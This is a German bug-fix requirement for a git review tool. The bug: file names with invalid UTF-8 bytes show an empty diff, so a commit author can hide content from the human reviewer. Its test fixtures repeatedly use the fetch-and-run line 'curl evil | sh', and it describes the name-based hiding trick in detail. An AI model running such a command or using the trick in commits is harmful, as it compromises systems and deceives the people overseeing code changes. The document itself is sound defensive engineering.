---
id: R00013
status: Neu
datum: 2026-11-24
ursprung: Bug-Report
ursprungslauf: R00004
---

# R00013: Behebung von „Diff leer bei Dateiname mit ungültigem Byte“

## Beschreibung

Enthält der Name einer Datei ein Byte, das kein gültiges UTF-8 ist (z. B. `a\xFF.sh`), zeigt die Oberfläche für diese Datei „Keine Zeilenänderungen“, obwohl die Dateiliste `+1 −0` nennt. Die Schnittstelle antwortet `200` mit `art: "text"` und `patch: ""`. Der Mensch hakt die Datei ab und hat ihren Inhalt nie gesehen.

Reproduktion: Repo N aus der User Story (`user-stories/R00013.md`), `gitreviewA <n> --kein-browser`; Datei `a\xFF.sh` (Inhalt `curl evil | sh`) wählen, oder `GET /api/commits/<voller Hash von n>/diff?pfad=a⟨0xFF⟩.sh`. Erwartet: der echte Patch (`+curl evil | sh`) oder ein klarer Fehlerausgang. Tatsächlich: `200`, leerer Patch, „Keine Zeilenänderungen“.

Der Angreifer ist der Autor des geprüften Commits: er versteckt den Inhalt einer Datei vor dem Menschen. Bei einem Doppelgänger-Paar (wörtlich `f⟨0xFF⟩.txt` neben `f\xFF.txt`) tragen zwei Zeilen denselben Namen; beide zeigen den Patch der wörtlich benannten Datei.

Der Fehler besteht seit R00004 (vorher mit dem Ersatzzeichen U+FFFD im Namen, derselbe leere Patch). Gefunden in der Nachprüfung von Karte #16 (security-reviewer), außerhalb von R00011 und deshalb eigene Karte (#28).

Zahlt ein auf: [Vision](R00000-vision.md) — der prüfende Mensch „sieht genau die Commits“ und liest, was die KI geändert hat (Abschnitt „Der prüfende Mensch“), und das Sicherheitswissen (fremdes Repo: Anzeige darf nichts verbergen). Ein versteckter Inhalt ist das Gegenteil dieses Ziels.

Ändert [R00004](R00004-diff-einer-datei-lesen.md) (Diff einer Datei lesen, I0006) im Zusagenteil „Pfad als wörtlicher Pfad“, „Diffs wie `git`“. Setzt [R00011](R00011-datei-abhaken.md) voraus (Karte #16): dort kommt die verlustfreie Dekodierung fremder Namen (`⟨0xFF⟩` statt U+FFFD, Klasse `Fremdtext/FremdeBytes`) nach `main`.

## Ursachenanalyse

### Root Cause

Stand `karte/16` (die Dekodierung liegt noch nicht auf `main`; auf `main` steht in `Pfad` das Ersatzzeichen U+FFFD, die Wirkung ist dieselbe).

1. `GitStart.Im` setzt `StandardOutputEncoding = FremdeBytes.Utf8MitBytemarken` (`src/GitReviewA/Git/GitStart.cs`): die Dateiliste von `git show --raw --numstat -z` wird als Text gelesen, jedes Byte außerhalb von UTF-8 wird zur Marke `⟨0xFF⟩`. Aus `Dateiaenderung.Pfad` (`DateiaenderungenParser`) lassen sich die Bytes nicht mehr herstellen: `a⟨0xFF⟩.sh` kann ein Name mit dem Byte `FF` sein oder ein Name, der die Zeichen `⟨0xFF⟩` wörtlich trägt (Zeichen U+27E8, `0xFF`, U+27E9).
2. `GitLeser.GitShowDiffStart` hängt `datei.Pfad` als Argument hinter `--` und `--literal-pathspecs` an `git show` (`GitLeser.cs`, Suchmuster `literal-pathspecs`). git sucht einen Pfad mit den Zeichen der Marke, findet nichts und gibt nichts aus (Probe 1: 0 Bytes).
3. `DiffLesenInteractor.AntwortFuer` nimmt die leere Ausgabe als Patch hin (`Diffaufbereitung.PatchAbErstemHunk("")` → `""`); die Art kommt aus der Dateiliste (`+1 −0` → `text`). Nichts vergleicht Patch und Zählung. Antwort: `200`, `art: "text"`, `patch: ""`; die Oberfläche zeigt „Keine Zeilenänderungen“ (`web/diff.js`).
4. Doppelgänger: `DiffLesenInteractor.DateiMitPfad` gibt den ersten Treffer mit genau gleichem Pfad zurück; beide Zeilen der Oberfläche fragen denselben Namen an und bekommen den Patch der wörtlich benannten Datei.

Ausgeschlossen: Konfiguration des fremden Repos (Probe 1 läuft mit den festen Optionen von `GitStart`), Pathspec-Zauber (`--literal-pathspecs` ist gesetzt), die Oberfläche (sie zeichnet, was die Schnittstelle liefert).

Eingetretene und latente Defekte: eingetreten ist der leere Patch bei Namen mit ungültigem Byte. Latent: jede andere Ursache für eine leere Ausgabe bei gezählten Änderungen (heute nicht bekannt) endet genauso still, weil Patch und Zählung nie verglichen werden.

### Proben im Wegwerf-Repo (Ablage des planers, git 2.48.1, .NET 10.0.100)

| Nr | Probe | Ergebnis |
|---|---|---|
| 1 | `git --literal-pathspecs show … -- 'a⟨0xFF⟩.sh'` (heutiger Aufruf) | 0 Bytes Ausgabe; Kontrolle `-- g.txt`: 105 Bytes |
| 2 | wörtlicher Name `f⟨0xFF⟩.txt` als Argument | liefert `+literal` (der Doppelgänger-Befund) |
| 3 | `git show … --pathspec-from-file=- --pathspec-file-nul` | `fatal: unrecognized argument` — `show` kennt die Option nicht |
| 4 | .NET `ProcessStartInfo.ArgumentList.Add("a\uDCFF.sh")` und `"a�.sh"` | git bekommt `61 ef bf bd 2e 73 68` (U+FFFD); das Byte `FF` ist als Argument nicht darstellbar |
| 5 | `git log --stdin -p --format= --no-walk … ` mit stdin `<Hash>\n--\na<FF>.sh\n`, Bytes über `Process.StandardInput.BaseStream` | `+curl evil | sh`, `@@ -0,0 +1 @@` |
| 6 | dieselbe Form für `f<FF>.txt` und für den wörtlichen Namen | je nur der eigene Patch (`+echt` bzw. `+literal`) |
| 7 | Umbenennung `s<FE>.txt` → `t<FE>.txt`, stdin mit beiden Namen | `rename from/to`, `−zeile8`, `+GEAENDERT` |
| 8 | gelöschte Datei `r<FF>.txt` | `@@ -1 +0,0 @@`, `−geheim` |
| 9 | Merge-Commit (`-m --first-parent`), Wurzelcommit, ganze Datei (`-U1000000`), Binärdatei mit und ohne `--text` | dieselben Ergebnisse wie `git show` |
| 10 | `git check-attr --stdin -z diff` mit `b<FF>.bin` | `diff: unspecified` — das Attribut der Datei, nicht eines Zeichenfolgen-Namens |
| 11 | Namen mit Zeilenumbruch (`n\nx.txt`) oder Wagenrücklauf am Ende (`c\r`) über stdin | 0 Bytes — stdin ist zeilenweise, git zerlegt den Namen; als Argument funktioniert der Name |
| 12 | Namen mit `"`, `-` vorn, Leerzeichen über stdin | Patch wie erwartet |
| 13 | `git diff <Blob-ID alt> <Blob-ID neu>` (Blob-IDs aus `--raw`) | geändert und umbenannt: richtiger Patch (Kopf trägt die IDs, der Patch beginnt ab `@@`); hinzugefügt und gelöscht: `fatal: ambiguous argument` — der leere Blob liegt nicht im Objektspeicher des fremden Repos, und ihn dort anzulegen wäre eine Schreibtat im geprüften Repo |

### Betroffene Komponenten

- `Git/GitStart`, `Git/GitLeser` (`DiffLesen`, `DiffAlsTextLesen`, `DiffAttributLesen`, `GitShowDiffStart`): Pfad als Argument.
- `Git/Dateiaenderung`, `Git/DateiaenderungenParser` und `Git/UebersichtParser` (gleicher Teilparser `LiesDateienEinesCommits`): die Namen verlieren ihre Bytes beim Dekodieren.
- `Diff/DiffLesenInteractor` (`DateiMitPfad`, `AntwortFuer`), `Diff/Differgebnis`, `Diff/DiffEndpunkt`, `Diff/GitDiffquelle`.
- `web/diff.js` (Text bei neuem Ausgang). Mitbetroffen, aber nicht Teil dieser Anforderung: Haken und Anmerkungen an einer Stelle `(Commit, Pfad)` (R00010, R00011) und der Netto-Diff in „Zusammen“ (I0010) — siehe Offene Fragen.

Mögliche Seiteneffekte der Behebung: der neue Leseweg (`git log --stdin`) ist ein neuer git-Aufruf mit allen Auflagen aus `AI-Team/gelerntes.md` (Marker-Skript-Probe, Konfigurationsprobe, Start aus Unterordner).

## Lösungsvorschlag

### Optionen

| | Option | Sicherheit (sieht der Mensch den Inhalt?) | Aufwand | Komplexität / Risiko | Reversibilität |
|---|---|---|---|---|---|
| A | **Ablehnen** (lokaler Fix): Name mit Marke → Fehlerausgang mit Meldung | Der Inhalt bleibt ungesehen, aber nichts ist mehr versteckt: die Warnung steht an der Datei. Der Mensch muss den Inhalt mit `git` selbst lesen. Ein wörtlicher Name `f⟨0xFF⟩.txt` wird zu Unrecht abgelehnt | 2 Bubbles, etwa 4 h | klein; kein neuer git-Aufruf | trivial |
| B | **Rohbytes mitführen, Pfad über stdin** (Komponentenänderung): die Dateiliste behält die Bytes ungültiger Namen; der Diff geht über `git log --stdin -p --no-walk` mit dem Pfad als Zeile hinter `--`; Reste (Doppelgänger, Zeilenumbruch im Namen mit ungültigem Byte) klar abgelehnt; Zählprüfung Patch gegen Dateiliste als Netz | Der Mensch sieht den echten Patch; wo das nicht geht, steht eine klare Meldung; nie ein leerer Patch | 5 Bubbles, 10 bis 16 h (ungemessen) | mittel; neuer git-Aufruf, Parser auf Bytes (zwei Parser); geprobt (Proben 5–12) | mittel: Parser und Aufruf bleiben lokal |
| C | **Stellen-Schlüssel statt Pfad** (Architektur): die Schnittstelle adressiert jede Datei mit einer Kennung (z. B. Hex der Rohbytes oder Index in der Dateiliste), Haken, Anmerkungen und Diff nutzen sie | wie B, dazu eindeutig auch beim Doppelgänger-Paar (beide Dateien lesbar, Haken getrennt) | über R00013 hinaus: Änderung der Schnittstelle von R00003, R00004, R00008, R00010, R00011 und der kommenden I0010/I0027 | groß; berührt fünf abgenommene Anforderungen | schwer |
| D | Blob-Diff über `--raw`-IDs (`git diff <alt> <neu>`) | wie B für geänderte Dateien | — | scheitert bei hinzugefügten und gelöschten Dateien (Probe 13), verliert Modus- und Umbenennungsangaben | — |
| E | Pfad als Argument mit Rohbyte oder `--pathspec-from-file` | — | — | nicht möglich: .NET kann das Byte nicht übergeben (Probe 4), `show` kennt die Option nicht (Probe 3) | — |
| F | den ganzen Commit-Diff lesen und die Datei ausschneiden | wie B | — | liest je Auswahl den ganzen Patch, verletzt „Diffs je Datei bei Bedarf“ und das Lastprofil der Vision | — |

**Empfehlung: B.** Begründung: Nur B und C zeigen dem Menschen den Inhalt — das verlangt die Vision, ein versteckter Inhalt ist ihr Gegenteil. A schließt die Täuschung, lässt aber die Prüfung genau dort aus, wo der Angreifer hinzielt; wer nach A „Diff nicht lesbar“ liest, wird die Datei vermutlich trotzdem abhaken. C löst zusätzlich das Doppelgänger-Paar vollständig, ändert aber fünf abgenommene Schnittstellen und gehört, falls gewollt, in eine eigene Anforderung nach R00013 (Offene Frage 2). D und E sind geprobt und scheiden aus, F verletzt das Lastprofil.

Entscheidung bis zur Antwort: B mit Ablehnung für das Doppelgänger-Paar. Der Entwickler darf die Form des stdin-Aufrufs ändern, solange die Kriterien gelten.

### Langfristige Lösung

Option B in fünf Schritten (Ablauf unter „Technische Überlegungen“): Rohbytes der Namen behalten, Doppelgänger und nicht übergebbare Namen ablehnen, Diff mit Rohbytes über stdin lesen, Patch gegen die Zählung der Dateiliste prüfen, Meldung in der Oberfläche.

### Alternative Ansätze

A (nur Ablehnen) — verworfen: Prüfung des Inhalts bleibt aus. C (Stellen-Schlüssel) — verschoben: zu groß für einen Fix, eigene Anforderung, falls der Betreiber das Doppelgänger-Paar lesbar will. D (Blob-Diff) — verworfen: geprobt, scheitert bei hinzugefügten und gelöschten Dateien. E (Argument, `--pathspec-from-file`) — nicht möglich, geprobt. F (ganzer Commit-Diff) — verworfen: Lastprofil.

## Test-Strategie

Testebene je Kriterium nach `AI-Team/factory.md` („Testbarkeit und Testverteilung“): Standard Integrationstest gegen den `DiffLesenInteractor` mit echtem `git` im Wegwerf-Repo (Treiber in-process, wie die vorhandenen `DiffLesenTreiber`); Playwright nur für die Anzeige (Kriterium 10), weil sie nur im Browser prüfbar ist und der Fall nicht auf dem Hot Path liegt, aber „Keine Zeilenänderungen“ ist die Täuschung selbst.

### Test zur Bug-Reproduktion (zuerst rot)

`DiffLesenInteractorFremdeNamenTests.Lesen_Name_mit_ungueltigem_Byte_liefert_den_Patch`: Arrange Repo N (Skript in der User Story), `Commitzeilen` mit `n`, echte `GitDiffquelle`; Act `Lesen(new Diffanfrage(n, "a⟨0xFF⟩.sh", false, Aenderungen))`; Assert Ausgang `Gelesen`, `Patch` enthält `+curl evil | sh`. Ohne den Fix liefert der Aufruf `Gelesen` mit `Patch == ""` — der Test ist rot. Die Dateiliste kommt dabei aus dem echten `git` (Kriterium 1), nicht aus einem Fake: sonst fehlen die Rohbytes, auf die der Fix aufbaut.

### Code-Extraktion für isoliertes Testing

- Zählprüfung als reine Operation: `Patchzaehlung.Von(patch)` → `(plus, minus)` (Zeilen ab dem ersten `@@`, Vorzeichen `+`/`−`, ohne `\ No newline`), und `Diffpruefung.Stimmt(patch, plus, minus)`. Unit zuerst: `g.txt` +1 −0, Umbenennung +1 −1, leerer Patch bei +1 −0 → falsch, Zeile `++x` (Inhalt `+x`) zählt als eine Plus-Zeile.
- Namensprüfung rein: `Namensfall.Von(trefferZahl, rohbytes)` → `Lesbar | Ablehnen`.
- Parser der Dateiliste auf Bytes: `DateiaenderungenParser.Parse(byte[])` mit Unit-Tests für die Namen aus Repo N (`a<FF>`, `f<FF>`, wörtliches `f⟨0xFF⟩`, `s<FE>` → `t<FE>`): Rohbytes gesetzt genau bei ungültigem UTF-8.

### Regressionstests

- Integration: alle Kriterien unten; dazu die vorhandenen Tests zu `GitLeser.DiffLesen`, `DiffLesenInteractor`, `DateiaenderungenParser` und `UebersichtParser` laufen unverändert; Mutanten für Wächter (Skill `test-ehrlichkeit`): Zählprüfung aus → Kriterium 9 rot, Doppelgänger-Prüfung aus → Kriterium 6 rot, `--` vor dem Pfad aus → ein Name mit `-` vorn liest nichts.
- Marker-Skript-Probe und Konfigurationsprobe für den neuen Aufruf (Kriterium 11), Start aus einem Unterordner des Repos.
- Playwright: Kriterium 10 (Anzeige).
- Gesamtlauf aller Ebenen grün.

## Akzeptanzkriterien

Vorbereitung: Repo N und seine Commits `b`, `n`, `w` stehen in `user-stories/R00013.md`; „Name mit Marke“ heißt der Name, wie ihn die Dateiliste zeigt (`a⟨0xFF⟩.sh` für `a\xFF.sh`). Alle Kriterien außer 10 sind Integrationstests gegen den `DiffLesenInteractor` (oder, gleichwertig, `GET /api/commits/<voller Hash von n>/diff?pfad=<Name mit Marke>` gegen das laufende Programm).

### Diff lesen (Abnahme-Probe des security-reviewers, wörtlich eingearbeitet)
- [ ] 1. Gegeben `n`, wenn der Diff von `a⟨0xFF⟩.sh` (Inhalt `curl evil | sh`) angefragt wird, dann ist die Antwort der echte Patch: Kopf `@@ -0,0 +1 @@` und die Zeile `+curl evil | sh`, Art `text` — nie `200` mit `art: "text"` und leerem Patch. (Reproduktionstest, heute rot.)
- [ ] 2. Gegeben `n`, wenn der Diff von `r⟨0xFF⟩.txt` (gelöscht, Inhalt `geheim`) angefragt wird, dann steht dort `@@ -1 +0,0 @@` und `−geheim`.
- [ ] 3. Gegeben `n`, wenn der Diff von `t⟨0xFE⟩.txt` (umbenannt aus `s⟨0xFE⟩.txt`, Zeile 8 von `zeile8` zu `GEAENDERT`) angefragt wird, dann zeigt er genau `−zeile8` und `+GEAENDERT` (Rechnung: +1 −1, nicht +8 — die Datei erscheint nicht als neu hinzugefügt); mit „ganze Datei“ (R00008) kommen `zeile1` bis `zeile7` als Kontext dazu.
- [ ] 4. Gegeben `n`, wenn der Diff der Binärdatei `b⟨0xFF⟩.bin` angefragt wird, dann steht dort „Binärdatei“ ohne Byte-Inhalt; wählt man „Als Text zeigen“, dann enthält der Text `+curl evil | sh` (Zeile 2 der Datei, nach `A\0B`).

### Nie leer, nie die falsche Datei
- [ ] 5. Gegeben `n`, wenn der Diff einer Datei mit Name „mit Marke“ angefragt wird, dann ist die Antwort entweder der echte Patch (Kriterien 1–4) oder ein klarer Fehlerausgang (Status ungleich 200 mit Meldung) — nie `200` mit leerem Patch und `art: "text"` für eine Datei, deren Zählung `+n −m` mit n + m > 0 nennt.
- [ ] 6. Gegeben `n` mit dem Paar `f⟨0xFF⟩.txt` (wörtlich, Inhalt `literal`) und `f\xFF.txt` (Inhalt `echt`), wenn man den Diff mit dem Namen `f⟨0xFF⟩.txt` anfragt, dann antwortet die Schnittstelle mit dem klaren Fehlerausgang (derselbe wie in Kriterium 7, der Name ist nicht eindeutig) — weder mit `+literal` noch mit `+echt`; die Dateiliste führt beide Zeilen weiter, jede zeigt für sich den Fehler, keine zeigt den Patch der anderen.
- [ ] 7. Gegeben `n` mit der Datei `z\n\xFF.txt` (Zeilenumbruch und ungültiges Byte im Namen, Inhalt `zeilenumbruch`), wenn ihr Diff angefragt wird, dann antwortet die Schnittstelle mit dem klaren Fehlerausgang (Name lässt sich nicht an `git` übergeben), nie mit `200` und leerem Patch.
- [ ] 8. Gegeben die Datei `w⟨0xFF⟩.txt` (wörtlich, Inhalt `woertlich`, ohne ungültigen Zwilling) in Commit `w`, wenn ihr Diff angefragt wird, dann steht dort `+woertlich` — ein wörtlicher Name wird nicht zu Unrecht abgelehnt.
- [ ] 9. Gegeben eine Datei der Dateiliste mit der Zählung `+1 −0`, deren Diff-Aufruf einen leeren Patch liefert (Fehler im Lesen, Test mit einer Diffquelle, die `""` liefert), wenn ihr Diff angefragt wird, dann antwortet die Schnittstelle mit dem Fehlerausgang „Diff konnte nicht gelesen werden“ (500), nie mit `200`. Rechnung: Patch mit 0 Plus- und 0 Minus-Zeilen ≠ Zählung 1 + 0; ein Patch mit genau den gezählten Zeilen (`g.txt`: 1 + 0) besteht.

### Anzeige
- [ ] 10. Gegeben `n`, wenn man in der Dateiliste nacheinander `a⟨0xFF⟩.sh`, `f⟨0xFF⟩.txt` (beide Zeilen des Paares) und `z\n\xFF.txt` wählt, dann steht bei `a⟨0xFF⟩.sh` der Patch mit `+curl evil | sh`, bei den anderen der Text „Diff dieser Datei nicht lesbar (Name mit ungültigem Byte)“ — an keiner dieser Stellen „Keine Zeilenänderungen“ und in keiner Zeile des Paares der Patch der anderen —, die Dateiliste und die Commit-Leiste bleiben bedienbar, und ein Klick auf `g.txt` zeigt dessen Patch.

### Kontrolle und fremdes Repo
- [ ] 11. Gegeben `n` mit `g.txt` (`+neu`) und `in.txt` (`+y`), wenn man ihre Diffs anfragt, dann kommt jeweils ihr Patch wie vor der Änderung; die Kriterien „Seltsame Namen“ und „Eingabe an git und fremdes Repo“ aus R00004 (Marker-Skripte für `diff.external`, `textconv`, `command`, Konfiguration `diff.context=0`, `diff.relative`, Start aus einem Unterordner des Repos) gelten unverändert auch für den Aufruf, der Namen mit ungültigem Byte liest: mit der Marker-Konfiguration liefert `a⟨0xFF⟩.sh` denselben Patch und keine der Marker-Dateien entsteht.

Grenz- und Leerfälle bedacht: Wurzelcommit, Merge (Probe 9) und Name mit `-` vorn, `"`, Leerzeichen (Probe 12) bleiben durch die vorhandenen Kriterien und Mutanten gedeckt; verworfen als eigenes Kriterium: eine Datei mit mehreren ungültigen Bytes (`a\xFF\xFE.sh`) — derselbe Weg wie Kriterium 1, im Unit-Test des Parsers abgedeckt.

## Implementierungshinweise

Vorplanung; was am Ende gebaut wird, entscheidet der Entwickler. Dateien auf `karte/16` gelesen (`FremdeBytes.cs`, `GitStart.cs`, `GitLeser.cs`, `DateiaenderungenParser.cs`, `DiffLesenInteractor.cs`, `DiffEndpunkt.cs`), Änderungen erst nach dem Merge von #16 auf `main`.

### Ablauf
1. **Dateiliste als Bytes lesen** — `git show/log --raw --numstat -z`: die Ausgabe als Bytes holen, an NUL zerlegen, je Teil gültiges UTF-8 wie heute dekodieren; ist ein Teil kein gültiges UTF-8, steht im Namen die Marke (`FremdeBytes`) und die Rohbytes bleiben an der Datei (`Dateiaenderung.Rohpfad`, bei Umbenennung auch `RohAlterPfad`; sonst leer).
2. **Treffer prüfen** — `DiffLesenInteractor`: Anzahl der Einträge mit genau dem angefragten Namen. 0 → 404 wie heute. Mehr als 1 → Ausgang „Name nicht eindeutig“. Genau 1 mit Rohbytes, die LF oder CR enthalten → Ausgang „Name nicht übergebbar“.
3. **Diff lesen** — ohne Rohbytes unverändert (Argument). Mit Rohbytes: `git [feste Optionen von GitStart] --literal-pathspecs log --stdin -p --format= --no-walk -m --first-parent --diff-merges=first-parent --root -M <-U…> --no-color --no-ext-diff --no-textconv --ignore-submodules=none --submodule=short --no-relative [--text]`, stdin: `<voller Hash>\n--\n<Rohbytes Pfad>\n[<Rohbytes alter Pfad>\n]`, Bytes über `StandardInput.BaseStream`, UTF-8-Namen als UTF-8-Bytes; der Hash kommt aus der Aufrufmenge, nie aus der Anfrage. Binär-Grund: `git check-attr --stdin -z diff`.
4. **Netz** — `Diffpruefung`: Patch einer Textdatei (`art: text`, nicht „als Text gewählt“ bei Binärdatei) hat so viele `+`- und `−`-Zeilen wie die Zählung der Dateiliste; sonst `NichtLesbar` (500, Meldung wie R00004), Fehler mit Commit und Datei auf stderr.
5. **Anzeige** — neuer Ausgang `NameNichtLesbar` (Status 422, `{fehler: "Diff dieser Datei nicht lesbar (Name mit ungültigem Byte)"}`); `diff.js` zeigt den Text und bleibt bedienbar.

### Grobentwurf
- `Dateiaenderung` (DTO, immutable) — um `Rohpfad` und `RohAlterPfad` erweitert (nur gesetzt, wenn der Name kein gültiges UTF-8 ist); Gleichheit über den Inhalt der Bytes, nicht die Referenz.
- `DateiaenderungenParser`, `UebersichtParser` — lesen Bytes; ein gemeinsamer Teilparser.
- `GitLeser.DiffLesen`/`DiffAlsTextLesen`/`DiffAttributLesen` — wählen Argument oder stdin nach `Rohpfad`.
- `Diffpruefung` (Operation, rein) und `Patchzaehlung` (Operation, rein).
- `Diffausgang.NameNichtLesbar` (neu), `Differgebnis.NameNichtLesbar`, `DiffEndpunkt` (422).

## Offene Fragen

1. An den product-owner: Doppelgänger-Paar **beide ablehnen** (Empfehlung, Kriterium 6; kein Eingriff in die Namensanzeige) oder die Namensanzeige eindeutig machen (ein wörtliches `⟨` im Namen als `⟨U+27E8⟩` zeigen, dann sind beide Dateien lesbar, ändert aber den Marken-Vertrag aus R00011 und die Anzeige legitimer Namen)? Bis zur Antwort gilt die Ablehnung.
2. An den product-owner: **Haken und Anmerkung** an einer Datei, deren Diff nicht lesbar ist, und an einem Doppelgänger-Paar (gleiche Stelle `(Commit, Name)` für zwei Dateien): sperren, oder reicht der Hinweis? Betrifft R00010/R00011 und I0010/I0027, nicht R00013; Empfehlung: nach R00013 als eigene Anforderung prüfen, vorher nicht blockieren.
3. An den Entwickler (keine Rückfrage): Windows und macOS kennen Namen mit ungültigem UTF-8 im Arbeitsbaum nicht (macOS lehnt sie ab, Windows nutzt UTF-16); im Repo-Objekt kommen sie vor, wenn der Autor sie anlegt. Die Proben liefen unter Linux; die E2E-Szenarien laufen dort. Ob `git log --stdin` unter Windows dieselben Bytes liest, ist ungeprüft (R00009 nennt Windows ohne Probe).

Keine davon blockiert den Bau; die Empfehlungen gelten bis zur Antwort.

## Warum löst diese Anforderung das Problem?

Auslöser: Eine KI schreibt einen Commit, dessen Dateiname ein ungültiges Byte trägt; gitreviewA zeigt für diese Datei „Keine Zeilenänderungen“, der Mensch hakt sie ab, und `curl evil | sh` ist ungesehen im Ergebnis „geprüft“. Zielbild: der Mensch liest jede Änderung, oder er erfährt, dass er eine nicht lesen konnte. Kette: Dateiliste behält die Rohbytes des Namens → der Diff-Aufruf übergibt sie über stdin an `git` (dort ist das Byte darstellbar, im Argument nicht) → `git` findet die Datei und liefert den echten Patch (Kriterien 1–4); wo das nicht geht (Doppelgänger, Zeilenumbruch im Namen), meldet die Schnittstelle einen Fehler statt eines leeren Patches (Kriterien 6, 7), und die Zählprüfung (Kriterium 9) fängt jede künftige Ursache einer leeren Ausgabe ab, weil Patch und Zählung der Dateiliste nie mehr auseinanderlaufen dürfen. Der Hebel ist die Übergabe des Namens, nicht die Anzeige: ein Text in der Oberfläche allein (Option A) macht die Täuschung sichtbar, aber nicht die Datei lesbar.

## Notizen

- Priorität: Kritisch (Vorrang-Karte #28, Label `sicherheit`).
- Betroffene Nutzer/Systeme: der prüfende Mensch und die KI, die für ihn `gitreviewA` aufruft; jedes geprüfte Repo mit einem Namen aus ungültigem UTF-8 (Angriff oder Altdaten aus Latin-1-Zeiten).
- Workaround: den Diff dieser Datei mit `git show <Hash> -- <Datei>` im Terminal lesen; die Oberfläche warnt bis zur Behebung nicht.
- Vorgeschlagene Bubbles und Zählung: `Dokumentation/Planung/gitreviewa.md`, I0029 (B1201–B1205): 5 Bubbles, davon 2 klar (2 h, Richtwert) und 3 unklar (2–4 h), Untergrenze 10 h, obere Schätzung 16 h, alles ungemessen.
- Verworfene Alternativen: siehe „Optionen“ (A, C, D, E, F) mit je einem Satz.
